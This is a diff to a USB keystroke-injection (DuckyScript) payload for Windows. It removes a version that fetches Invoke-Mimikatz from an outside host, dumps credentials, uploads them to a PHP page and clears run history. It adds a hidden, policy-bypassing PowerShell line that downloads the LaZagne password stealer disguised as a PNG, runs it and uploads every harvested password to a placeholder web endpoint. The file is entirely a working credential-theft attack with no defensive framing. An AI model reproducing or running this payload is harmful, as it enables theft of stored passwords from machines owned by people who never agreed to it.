@@ -1,20 +1,10 @@
-REM Invoke Mimikatz and upload result to webserver
-REM Thanks to Hak5 for the tutorial!
-REM https://www.hak5.org/blog/15-second-password-hack-mr-robot-style
+REM Opens lazagne, saves output to PHP file on webserver.
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell Start-Process cmd -Verb runAs
-DELAY 750 
-ALT y
-DELAY 750
-STRING mode con:cols=18 lines=1; color FE
+STRING cmd.exe /T:01 /K mode CON: COLS=17 LINES=1
 ENTER
-STRING powershell "IEX (New-Object Net.WebClient).DownloadString('https://pwningstuff.000webhostapp.com/executables/im.ps1'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('https://pwningstuff.000webhostapp.com/upload/creds/rxc.php', $output)"
-ENTER
-DELAY 15000
-STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
-ENTER
-DELAY 250
-STRING exit
+DELAY 1000
+STRING powershell -NoP -NonI -Window Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile(\"http://pwningstuff.000webhostapp.com/executables/laz.png\",\"$env:temp\laz.exe\"); $output = & $env:temp\laz.exe all | Out-String
+STRING ; (New-Object Net.WebClient).UploadString('YOUR_PHP_LINK', $output)"
 ENTER
